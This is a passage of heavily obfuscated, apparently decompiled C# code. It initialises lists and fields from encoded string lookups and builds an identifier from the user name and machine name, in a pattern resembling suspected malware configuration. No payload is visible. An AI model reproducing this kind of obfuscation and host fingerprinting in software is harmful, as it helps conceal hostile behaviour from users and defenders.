			OEjiexKEqeO(getString_0(107356867)),
			OEjiexKEqeO(getString_0(107356805)),
			OEjiexKEqeO(getString_0(107357288)),
			OEjiexKEqeO(getString_0(107357259)),
			OEjiexKEqeO(getString_0(107357178)),
			OEjiexKEqeO(getString_0(107357161)),
			OEjiexKEqeO(getString_0(107357120)),
			OEjiexKEqeO(getString_0(107357059)),
			OEjiexKEqeO(getString_0(107356518)),
			OEjiexKEqeO(getString_0(107356445)),
			OEjiexKEqeO(getString_0(107356400)),
			OEjiexKEqeO(getString_0(107356387)),
			OEjiexKEqeO(getString_0(107356354)),
			OEjiexKEqeO(getString_0(107356297)),
			OEjiexKEqeO(getString_0(107356732)),
			OEjiexKEqeO(getString_0(107356707)),
			OEjiexKEqeO(getString_0(107356674)),
			OEjiexKEqeO(getString_0(107356601)),
			OEjiexKEqeO(getString_0(107356572)),
			OEjiexKEqeO(getString_0(107355999)),
			OEjiexKEqeO(getString_0(107355966)),
			OEjiexKEqeO(getString_0(107355941)),
			OEjiexKEqeO(getString_0(107355868)),
			OEjiexKEqeO(getString_0(107355851)),
			OEjiexKEqeO(getString_0(107355818)),
			OEjiexKEqeO(getString_0(107356249)),
			OEjiexKEqeO(getString_0(107356236)),
			OEjiexKEqeO(getString_0(107356155)),
			OEjiexKEqeO(getString_0(107356142)),
			OEjiexKEqeO(getString_0(107356061)),
			OEjiexKEqeO(getString_0(107356028)),
			OEjiexKEqeO(getString_0(107355475)),
			OEjiexKEqeO(getString_0(107355466)),
			OEjiexKEqeO(getString_0(107355389)),
			OEjiexKEqeO(getString_0(107359158)),
			OEjiexKEqeO(getString_0(107355356)),
			OEjiexKEqeO(getString_0(107355315)),
			OEjiexKEqeO(getString_0(107355258)),
			OEjiexKEqeO(getString_0(107355741)),
			OEjiexKEqeO(getString_0(107355708)),
			OEjiexKEqeO(getString_0(107355675)),
			OEjiexKEqeO(getString_0(107355658)),
			OEjiexKEqeO(getString_0(107355629)),
			OEjiexKEqeO(getString_0(107355584)),
			OEjiexKEqeO(getString_0(107355507)),
			OEjiexKEqeO(getString_0(107354986)),
			OEjiexKEqeO(getString_0(107354897)),
			OEjiexKEqeO(getString_0(107354880)),
			OEjiexKEqeO(getString_0(107354851)),
			OEjiexKEqeO(getString_0(107354774))
		};
		tKhSHdXkDw = new List<string>
		{
			OEjiexKEqeO(getString_0(107354765)),
			OEjiexKEqeO(getString_0(107355196)),
			OEjiexKEqeO(getString_0(107355179)),
			OEjiexKEqeO(getString_0(107355098)),
			OEjiexKEqeO(getString_0(107355081)),
			OEjiexKEqeO(getString_0(107355016)),
			OEjiexKEqeO(getString_0(107354395)),
			OEjiexKEqeO(getString_0(107354334))
		};
		FcllHXSYzCkoLu = new List<string>
		{
			OEjiexKEqeO(getString_0(107354309)),
			OEjiexKEqeO(getString_0(107354276)),
			OEjiexKEqeO(getString_0(107354711)),
			OEjiexKEqeO(getString_0(107354694)),
			OEjiexKEqeO(getString_0(107354661)),
			OEjiexKEqeO(getString_0(107354580)),
			OEjiexKEqeO(getString_0(107354567)),
			OEjiexKEqeO(getString_0(107354534)),
			OEjiexKEqeO(getString_0(107354501)),
			OEjiexKEqeO(getString_0(107353956)),
			OEjiexKEqeO(getString_0(107353923)),
			OEjiexKEqeO(getString_0(107353890)),
			OEjiexKEqeO(getString_0(107353817)),
			OEjiexKEqeO(getString_0(107353776)),
			OEjiexKEqeO(getString_0(107353763)),
			OEjiexKEqeO(getString_0(107353730)),
			OEjiexKEqeO(getString_0(107354169)),
			OEjiexKEqeO(getString_0(107354136)),
			OEjiexKEqeO(getString_0(107354127)),
			OEjiexKEqeO(getString_0(107354086)),
			OEjiexKEqeO(getString_0(107354053)),
			OEjiexKEqeO(getString_0(107353980)),
			OEjiexKEqeO(getString_0(107353435)),
			OEjiexKEqeO(getString_0(107354309)),
			OEjiexKEqeO(getString_0(107353394)),
			OEjiexKEqeO(getString_0(107353385)),
			OEjiexKEqeO(getString_0(107353308)),
			OEjiexKEqeO(getString_0(107353275)),
			OEjiexKEqeO(getString_0(107353234)),
			OEjiexKEqeO(getString_0(107353225)),
			OEjiexKEqeO(getString_0(107353704)),
			OEjiexKEqeO(getString_0(107353631)),
			OEjiexKEqeO(getString_0(107353590)),
			OEjiexKEqeO(getString_0(107354276)),
			OEjiexKEqeO(getString_0(107353581)),
			OEjiexKEqeO(getString_0(107354711)),
			OEjiexKEqeO(getString_0(107353548)),
			OEjiexKEqeO(getString_0(107353515)),
			OEjiexKEqeO(getString_0(107353474)),
			OEjiexKEqeO(getString_0(107352929)),
			OEjiexKEqeO(getString_0(107352856)),
			OEjiexKEqeO(getString_0(107352847)),
			OEjiexKEqeO(getString_0(107352814)),
			OEjiexKEqeO(getString_0(107352781)),
			OEjiexKEqeO(getString_0(107352740)),
			OEjiexKEqeO(getString_0(107353179)),
			OEjiexKEqeO(getString_0(107353138))
		};
		MRwbBvIEaNYw = new List<string>
		{
			OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107353129))),
			OEjiexKEqeO(getString_0(107353048)),
			OEjiexKEqeO(getString_0(107352955)),
			OEjiexKEqeO(getString_0(107352346)),
			OEjiexKEqeO(getString_0(107352253)),
			OEjiexKEqeO(getString_0(107352668)),
			OEjiexKEqeO(getString_0(107352575)),
			OEjiexKEqeO(getString_0(107352478)),
			OEjiexKEqeO(getString_0(107351905)),
			OEjiexKEqeO(getString_0(107351808)),
			OEjiexKEqeO(getString_0(107351715)),
			OEjiexKEqeO(getString_0(107352130)),
			OEjiexKEqeO(getString_0(107352037)),
			OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107353129)))
		};
		fJgPhlsQHtYagv = OEjiexKEqeO(getString_0(107351940));
		KIKFUpmawnRBIE = new List<string>
		{
			OEjiexKEqeO(getString_0(107351283)),
			OEjiexKEqeO(getString_0(107351601)),
			OEjiexKEqeO(getString_0(107351439)),
			OEjiexKEqeO(getString_0(107350733)),
			OEjiexKEqeO(getString_0(107351051)),
			OEjiexKEqeO(getString_0(107350345))
		};
		WjopLCEDSl = new List<string>
		{
			OEjiexKEqeO(getString_0(107350151)),
			OEjiexKEqeO(getString_0(107350602)),
			OEjiexKEqeO(getString_0(107350541))
		};
		dNiPJscrdZ = getString_0(107396345);
		pRwaCpJBKvM = getString_0(107396345);
		AiPmmCrNxON = new DateTime(2000, 1, 1);
		TyxvmRxEqTldBX = new DateTime(2100, 1, 1);
		krdgQbbXWsBnkAs = getString_0(107396811);
		bQealBkUmzhp = getString_0(107397936);
		IjKkEPdMxTo = getString_0(107396345);
		SsLdaQJOERuN = getString_0(107396345);
		zCYQvPmGdWb = getString_0(107396345);
		SwTuLSeNkXgX = getString_0(107396811);
		GZbePnAiKIwM = getString_0(107396345);
		pRibgXhmfietto = getString_0(107396345);
		tnUDcbYyevrzGRJA = new List<string>
		{
			getString_0(107395632),
			getString_0(107394834),
			getString_0(107395666),
			getString_0(107394715)
		};
		OGIisKmpnCtjYJtSZ = getString_0(107396345);
		dKLzVpzOOKvyJbR = getString_0(107350448);
		HmOIvziEgj = getString_0(107396345);
		wWsTKhWTnA = getString_0(107396345);
		ceBfodBwRY = getString_0(107396345);
		YrUNJYkfZORc = string.Empty;
		TECyIxCjZZeuQoS = getString_0(107396345);
		TLvIKeJnVejcNG = getString_0(107396811);
		cfLMhLbiCC = getString_0(107396811);
		dPIYrIPkEeCv = getString_0(107350475);
		LfrLWEkFCBwUa = getString_0(107349854);
		LHozEvFKfaDyxN = getString_0(107396345);
		ZQLLErbedcYeoR = getString_0(107396345);
		sWPChGvxft = getString_0(107396811);
		iEmzWvVANWWhs = getString_0(107396345);
		OXmgxFpvUExT = getString_0(107396345);
		EMMMLIMedETY = getString_0(107401155);
		OOffFbZtXHucK = getString_0(107396345);
		eBjqIYGqqxZnwj = getString_0(107396345);
		ZLERFztvScvXGTf = getString_0(107349328);
		ThomocmQwcHBb = getString_0(107396345);
		jIEUXOWHIovDRKPS = getString_0(107396345);
		lanIsMFtITLe = getString_0(107396811);
		cFytzeDiRIaBA = getString_0(107396345);
		ueuvoVAMScuH = getString_0(107349311);
		cXFsslHOuYyK = getString_0(107396811);
		dhEsUcbXeBeyR = getString_0(107396811);
		pUPogXfTsHTC = getString_0(107396345);
		XxUTdtdLXHJQFmlnR = getString_0(107396345);
		upziyoWzyCa = new string[0];
		RrpEvBQBLONZKo = getString_0(107396811);
		OTLCmOpFsMP = true;
		EBZNaOLOtuSLZ = getString_0(107396345);
		UpNccIaFzBadyA = true;
		GyAtBojDqJQga = false;
		ZuXmDgobJnjb = false;
		XeXEhFhfYVvh = false;
		bDDJFCkjBbYQ = getString_0(107349298);
		SWaMdrdKGgzowGl = false;
		UaZSFbxCjFNZv = false;
		jnImjWIMcpl = false;
		bTMUTlJGkGOO = false;
		NbfRNVirWcO = true;
		IKRtRLOSqagD = getString_0(107349277) + Environment.UserName + getString_0(107349264) + Environment.MachineName + getString_0(107349243) + AVKODeXgMr.RdWUiLAhRtYuk() + getString_0(107349238);
		SidumIOOlYmWUm = true;
		VxQUKIskXHMm = new Stopwatch();
		ZzaknwGiCeEd = 0;
		DPjjDEUnrYJ = 0;
		OtvlrYHFRq = false;
		YgTmUCLcTtww = getString_0(107349261) + AVKODeXgMr.RdWUiLAhRtYuk() + getString_0(107349252);
		PheHPPQQekLUCKI = new string[1] { getString_0(107349215) };
		GDqBfWNbeWwjD = new List<string>();
		PGvCWVOLTGYXz = 0;
		uBpdQdBJjeZ = true;
		DBkpQAKkEJYsTWP = false;
	}
}
